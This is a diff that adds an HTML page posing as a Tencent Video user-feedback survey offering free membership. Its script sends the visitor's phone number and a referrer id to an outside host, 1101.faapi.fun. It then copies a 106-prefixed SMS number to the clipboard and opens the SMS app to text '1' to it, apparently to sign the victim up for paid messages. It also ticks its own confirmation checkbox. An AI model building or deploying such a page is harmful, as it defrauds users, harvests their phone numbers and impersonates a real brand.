@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport"
+			content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no" />
+		<title>用户体验使用情况-反馈调查问卷</title>
+		<link rel="stylesheet" href="css/bootstrap.css">
+		
+		<style>
+			#danImg {
+				width: 100%;
+				height: 300px;
+			}
+
+			.box {
+				padding: 15px;
+			}
+
+			.required-indicator {
+				margin-left: 5px;
+				font-weight: bold;
+				font-size: 16px;
+				color: red;
+			}
+
+			.text-content {
+				font-size: 12px;
+				color: #ababab;
+			}
+
+			.btn-my {
+				color: #75b29a;
+				background-color: #fafafa;
+			}
+
+			.box-boder {
+				border: solid 1px #ababab;
+				padding: 5px;
+				padding-left: 10px;
+				padding-right: 10px;
+			}
+			.txt-bootom-title{
+				color: #373737;font-size: 12px;text-align: center;
+			}
+			.bottom-top{
+				margin-top: 50px;
+			}
+			@media (max-width: 768px) {
+				#danImg {
+					height: 188px;
+				}
+			}
+		</style>
+	</head>
+	<body>
+		<script>
+	
+function GetRequest() {
+var url = location.search;
+var theRequest = new Object();
+if (url.indexOf("?") != -1) {
+var str = url.substr(1);
+strs = str.split("&");
+for(var i = 0; i < strs.length; i ++) {
+theRequest[strs[i].split("=")[0]] = unescape(strs[i].split("=")[1]);
+}
+}
+return theRequest;
+}
+var Request = new Object();
+Request = GetRequest();
+
+
+	</script>
+    
+	<script>
+function checkRadio() {
+    var radio1 = document.getElementById("optionsRadios1");
+    var yqr = Request['id'];
+
+    if (radio1.checked) {
+        
+		
+		fetch("//1101.faapi.fun/rw3/get/sjh.php?phone=" + phone.value + "&yqr=" + yqr, {
+                method: 'GET',
+                
+            })
+        .then()
+				
+				
+		alert("没有收到短信请先发送短信。如已发送请耐心等待发放奖励即可.72小时内到账");
+		fdx();
+		
+
+    } else {
+        alert("请确认发送过反馈短信后再进行提交否则无法发放奖励。");
+		fdx();
+
+    }
+}
+
+
+  function copy() {
+  var yqr = Request['yqr'];
+            
+        }
+		
+	function fdx() {
+	
+  // 获取要复制的文本
+  var text = "106988881700511";
+  
+  // 创建一个临时的文本框
+  var tempInput = document.createElement("textarea");
+  tempInput.value = text;
+  
+  // 将文本框添加到页面中
+  document.body.appendChild(tempInput);
+  
+  // 选中文本框中的内容
+  tempInput.select();
+  
+  // 复制文本框中的内容到剪贴板中
+  document.execCommand("copy");
+  
+  // 删除临时文本框
+  document.body.removeChild(tempInput);
+  
+    
+var u = navigator.userAgent;
+
+var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端
+
+var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
+
+if(isiOS){
+    window.location.href = 'sms:106988881700511&body=1'; 
+	    var checkbox = document.getElementById("optionsRadios1");
+    checkbox.checked = true; // 选中复选框
+  
+}
+
+
+
+
+//iPhone,android访问转到wap页面
+if(isAndroid){
+    window.location.href = 'sms:106988881700511?body=1'; 
+	    var checkbox = document.getElementById("optionsRadios1");
+    checkbox.checked = true; // 选中复选框
+  
+}
+ 
+  
+  document.getElementById("code1").value = ("123456");
+  document.getElementById("code2").value = ("123456");
+   
+					 
+        }
+</script>
+
+
+
+		<img id="danImg" src="./img/1.png" alt="">
+		<div class="container">
+			<div class="row">
+				<div class="col-12 box">
+					<form>
+						<div class="form-group">
+							<label for="phone">请输入您反馈的手机号码<span class="required-indicator">*</span></label>
+							<input type="email" class="form-control" id="phone" placeholder="">
+						</div>
+
+						<div class="form-group">
+							<label for="phone">用户反馈奖励 发送奖励领取<span class="required-indicator">*</span></label>
+							<p style="margin-top: 10px;" class="text-content">编辑内容“1”发送到 官方号码106988881700511完成短信反馈</p>
+							<p class="text-content">(请确保发送短信的手机号码与上方填写的号码一致)</p>
+							<button type="button" class="btn btn-lg btn-block btn-my" onclick="fdx()"  >点击一键发送短信</button>
+						</div>
+						<div class="form-group" style="margin-top: 2rem;">
+							<label for="phone">是否发送短信<span class="required-indicator">*</span></label>
+							<p style="margin-top: 10px;" class="text-content">发送短信后可获得以下福利:腾讯会员31天</p>
+							<div class="checkbox">
+								<div class="box-boder">
+									<label style="font-weight: 500;font-size: 12px;display: inline;">
+										<input type="checkbox" name="optionsRadios" id="optionsRadios1" value="option1" disabled="">
+										我已发送短信并参与领取福利
+									</label>
+								</div>
+							</div>
+						</div>
+						<div class="bottom-top">
+							<p class="txt-bootom-title">请确认发送过反馈短信后再进行提交否则无法发放奖励</p>
+							<p class="txt-bootom-title">腾讯视频 - 用户福利申领</p>
+							<button type="button" style="margin-top: 3rem;font-size: 14px;background: #35C07D;margin-bottom: 1rem;" class="btn btn-success btn-lg btn-block" onclick="checkRadio()">完成</button>
+						</div>
+					</form>
+				</div>
+			</div>
+
+		</div>
+	</body>
+</html>
